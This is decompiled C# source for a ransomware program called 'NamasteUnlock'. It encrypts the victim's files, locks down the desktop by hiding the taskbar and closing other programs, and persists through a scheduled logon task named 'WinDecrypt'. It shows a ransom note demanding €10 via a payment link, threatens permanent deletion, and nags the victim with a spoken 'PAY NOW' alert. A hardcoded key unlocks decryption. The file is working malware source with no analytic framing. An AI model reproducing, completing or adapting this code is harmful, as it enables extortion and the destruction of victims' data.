using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32.TaskScheduler;

namespace NamasteUnlock;

public class Form1 : Form
{
	private Random rnd = new Random();

	public bool hasPaid;

	private const int WM_NCHITTEST = 132;

	private const int HT_CLIENT = 1;

	private const int HT_CAPTION = 2;

	private int ct;

	private bool backward;

	private bool done;

	private IContainer components;

	private Label label1;

	private Timer timer2;

	private Label label2;

	private WebBrowser webBrowser1;

	private TextBox textBox1;

	private Label label3;

	private Button button1;

	protected override void WndProc(ref Message m)
	{
		((Form)this).WndProc(ref m);
		if (((Message)(ref m)).get_Msg() == 132)
		{
			((Message)(ref m)).set_Result((IntPtr)2);
		}
	}

	public Form1()
	{
		InitializeComponent();
	}

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

	[DllImport("user32.dll")]
	private static extern int GetDesktopWindow();

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	public void StartWatcher()
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_004a: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Expected O, but got Unknown
		//IL_0330: Expected O, but got Unknown
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0383: Expected O, but got Unknown
		//IL_03cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d2: Expected O, but got Unknown
		//IL_03d7: Expected O, but got Unknown
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_045a: Unknown result type (might be due to invalid IL or missing references)
		//IL_045c: Expected O, but got Unknown
		//IL_0461: Expected O, but got Unknown
		Agent ag = new Agent();
		ag.StartEncryptionProcess();
		MethodInvoker val = default(MethodInvoker);
		while (ag.files < 300)
		{
			((Form)this).set_ShowInTaskbar(false);
			MethodInvoker obj = val;
			if (obj == null)
			{
				MethodInvoker val2 = delegate
				{
					((Control)this).Hide();
				};
				MethodInvoker val3 = val2;
				val = val2;
				obj = val3;
			}
			MethodInvoker val4 = obj;
			((Control)this).Invoke((Delegate)(object)val4);
			Thread.Sleep(100);
		}
		MethodInvoker val5 = (MethodInvoker)delegate
		{
			((Control)this).Show();
		};
		((Control)this).Invoke((Delegate)(object)val5);
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (!process.ProcessName.ToLower().Contains("runtimebroker") && !process.ProcessName.ToLower().Contains("apple_pie") && !process.ProcessName.ToLower().Contains("explorer"))
			{
				process.CloseMainWindow();
			}
		}
		Wallpaper.Set("https://cdn.discordapp.com/attachments/789910384710254624/802992960328433684/Hacker-Laptop-Wallpaper.jpg", Wallpaper.Style.Stretched);
		Thread.Sleep(1000);
		TaskService val6 = new TaskService();
		try
		{
			TaskDefinition val7 = val6.NewTask();
			val7.get_Principal().set_RunLevel((TaskRunLevel)1);
			val7.get_Actions().Add(Application.get_ExecutablePath(), (string)null, (string)null);
			TriggerCollection triggers = val7.get_Triggers();
			LogonTrigger val8 = new LogonTrigger();
			val8.set_UserId(WindowsIdentity.GetCurrent().Name);
			triggers.Add<LogonTrigger>(val8);
			val6.get_RootFolder().RegisterTaskDefinition("WinDecrypt", val7);
		}
		finally
		{
			((IDisposable)val6)?.Dispose();
		}
		MethodInvoker val9 = default(MethodInvoker);
		while (!hasPaid)
		{
			ShowWindow(FindWindow("Shell_TrayWnd", ""), 0);
			ShowWindow(FindWindowEx(GetDesktopWindow(), 0, "button", 0), 0);
			processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (!process2.ProcessName.ToLower().Contains("cmd") && !process2.ProcessName.ToLower().Contains("runtimebroker") && !process2.ProcessName.ToLower().Contains("apple_pie") && !process2.ProcessName.ToLower().Contains("chrome") && !process2.ProcessName.ToLower().Contains("edge") && !process2.ProcessName.ToLower().Contains("firefox") && !process2.ProcessName.ToLower().Contains("opera") && !process2.ProcessName.ToLower().Contains("safari") && !process2.ProcessName.ToLower().Contains("iexplore") && !process2.ProcessName.ToLower().Contains("chromium") && !process2.ProcessName.ToLower().Contains("brave") && !process2.ProcessName.ToLower().Contains("explorer"))
				{
					process2.CloseMainWindow();
				}
			}
			MethodInvoker obj2 = val9;
			if (obj2 == null)
			{
				MethodInvoker val10 = delegate
				{
					((Control)label2).set_Text(ag.files + " FILES HAVE BEEN ENCRYPTED SO FAR");
					((Form)this).CenterToScreen();
				};
				MethodInvoker val3 = val10;
				val9 = val10;
				obj2 = val3;
			}
			MethodInvoker val11 = obj2;
			((Control)this).Invoke((Delegate)(object)val11);
			Thread.Sleep(10);
		}
		ShowWindow(FindWindow("Shell_TrayWnd", ""), 1);
		ShowWindow(FindWindowEx(GetDesktopWindow(), 0, "button", 0), 1);
		TaskService val12 = new TaskService();
		try
		{
			val12.get_RootFolder().DeleteTask("WinDecrypt", true);
		}
		finally
		{
			((IDisposable)val12)?.Dispose();
		}
		ag.StartDecryptionProcess();
		Wallpaper.Set("https://i.imgur.com/S9Mj5u9.jpg", Wallpaper.Style.Stretched);
		MethodInvoker val13 = default(MethodInvoker);
		MethodInvoker obj3 = val13;
		if (obj3 == null)
		{
			MethodInvoker val14 = delegate
			{
				((Form)this).set_ShowInTaskbar(true);
				((Control)label1).set_Text("YOUR FILES ARE BEING DECRYPTED!");
				webBrowser1.set_ObjectForScripting((object)new BrowseClick());
				webBrowser1.set_DocumentText("<h3>Thank you for your payment!</h3>\r\n<p>Your files are currently being decrypted and we'll let you know once it has finished.</p><h4>DO NOT TURN YOUR COMPUTER OFF OR CLOSE THE PROGRAM AS IT WILL STOP THE DECRYPTION PROCESS AND SOME FILES MAY END UP GETTING CORRUPTED!</h4>\r\n                 ");
				webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
				webBrowser1.set_WebBrowserShortcutsEnabled(false);
				((Control)button1).set_Visible(false);
				((Control)label3).set_Visible(false);
				((Control)label2).set_Visible(false);
				((Control)textBox1).set_Visible(false);
				((Control)this).set_BackColor(Color.FromArgb(0, 255, 0));
			};
			MethodInvoker val3 = val14;
			val13 = val14;
			obj3 = val3;
		}
		MethodInvoker val15 = obj3;
		((Control)this).Invoke((Delegate)(object)val15);
		while (true)
		{
			int num = 0;
			foreach (Thread runningThread in ag.runningThreads)
			{
				if (runningThread != null && runningThread.IsAlive)
				{
					num++;
				}
			}
			if (num <= 0)
			{
				break;
			}
			Thread.Sleep(1000);
		}
		MethodInvoker val16 = default(MethodInvoker);
		MethodInvoker obj4 = val16;
		if (obj4 == null)
		{
			MethodInvoker val17 = delegate
			{
				//IL_0058: Unknown result type (might be due to invalid IL or missing references)
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt"))
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt");
				}
				File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Windows NT\\apple_pie.exe", Path.GetTempPath() + "\\kVNh37nmxcX6fZepxJUysKBN");
				MessageBox.Show("All done!\n\nYour files have been decrypted and you will now able to access them!\nHave a nice day, goodbye!");
				((Form)this).Close();
			};
			MethodInvoker val3 = val17;
			val16 = val17;
			obj4 = val3;
		}
		MethodInvoker val18 = obj4;
		((Control)this).Invoke((Delegate)(object)val18);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Location(new Point(-5000, -5000));
		timer2.set_Enabled(true);
		timer2.set_Interval(25);
		timer2.Start();
		webBrowser1.set_ObjectForScripting((object)new BrowseClick());
		webBrowser1.set_DocumentText("<h3>Wait, what happend?</h3>\r\n<p>All of your files are currently in the process of being encrypted and many of them have already been. To decrypt these files and recover them you need to pay <b>€10</b> via the website listed below and after payment you will get a decryption key that you can use. Your computer has also been put in lockdown mode and you will not be able to use it until you pay. You can <a href='#' onclick='window.external.openBrowser();'>click here</a> to open your web browser.</p>\r\n<h3>Can't I just close the program or restart my PC?</h3>\r\n<p>No. If you do so you will not be able to decrypt your files and they will also get deleted permanently. <b>Don't be stupid.</b></p>\r\n<h3>How do I pay?</h3>\r\n<p>You can pay the <b>€10</b> fee via one of the payment methods listed on the site below or visit the site directly via another device if you are not able to access it on this PC: <b>https://sellix.io/product/600dc38dbf44c</b> <br><a href='#' onclick='window.external.openPaymentSite();'><b>Click here to pay now</b></a></p>\r\n<h3>I paid, what's next? How do I recover my files?</h3>\r\n   <p> Input the key that was sent to your email below and press 'Decrypt my files'. Your files will start decrypting and will be made accessible again once finished. :)</p>\r\n                 ");
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		Thread thread = new Thread((ThreadStart)delegate
		{
			StartWatcher();
		});
		thread.IsBackground = true;
		thread.Start();
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (ct > 249)
		{
			backward = true;
		}
		if (backward && ct > 0)
		{
			ct -= 5;
		}
		else
		{
			backward = false;
			ct += 5;
		}
		Color foreColor = Color.FromArgb(ct, ct, ct);
		((Control)label1).set_ForeColor(foreColor);
		if (ct % 50 == 0 && !done && !hasPaid && ((Control)this).get_Visible())
		{
			done = true;
			new Thread((ThreadStart)delegate
			{
				//IL_0005: Unknown result type (might be due to invalid IL or missing references)
				//IL_000a: Unknown result type (might be due to invalid IL or missing references)
				Console.Beep();
				SpeechSynthesizer val = new SpeechSynthesizer();
				val.SetOutputToDefaultAudioDevice();
				val.Speak("PAY NOW TO RECOVER YOUR FILES");
				done = false;
			}).Start();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "BQdBbXBKTSuEspGupXfqmTVB")
		{
			hasPaid = true;
			MessageBox.Show("Thank you!\n\nThe encryption process will now begin and your computer will be unlocked.");
		}
		else
		{
			MessageBox.Show("Wrong key!\n\nBuy a key from the website linked above.");
		}
	}

	private void TextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void Label2_Click(object sender, EventArgs e)
	{
	}

	private void Label1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_02be: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c8: Expected O, but got Unknown
		//IL_0471: Unknown result type (might be due to invalid IL or missing references)
		//IL_047b: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		timer2 = new Timer(components);
		label2 = new Label();
		webBrowser1 = new WebBrowser();
		textBox1 = new TextBox();
		label3 = new Label();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(-3, 33));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(1331, 73));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("YOUR FILES HAVE BEEN ENCRYPTED!");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label1).add_Click((EventHandler)Label1_Click);
		timer2.add_Tick((EventHandler)Timer2_Tick);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(0, 121));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(1328, 73));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("1000 FILES HAVE BEEN ENCRYPTED SO FAR");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)label2).add_Click((EventHandler)Label2_Click);
		((Control)webBrowser1).set_Location(new Point(51, 185));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(1229, 416));
		((Control)webBrowser1).set_TabIndex(5);
		((Control)textBox1).set_Location(new Point(417, 647));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(412, 20));
		((Control)textBox1).set_TabIndex(6);
		((Control)textBox1).add_TextChanged((EventHandler)TextBox1_TextChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(265, 642));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(154, 24));
		((Control)label3).set_TabIndex(7);
		((Control)label3).set_Text("Decryption key:");
		((Control)button1).set_Location(new Point(848, 647));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(217, 23));
		((Control)button1).set_TabIndex(8);
		((Control)button1).set_Text("Decrypt my files");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)Button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(192, 0, 0));
		((Form)this).set_ClientSize(new Size(1328, 717));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("YOUR FILES HAVE BEEN ENCRYPTED");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
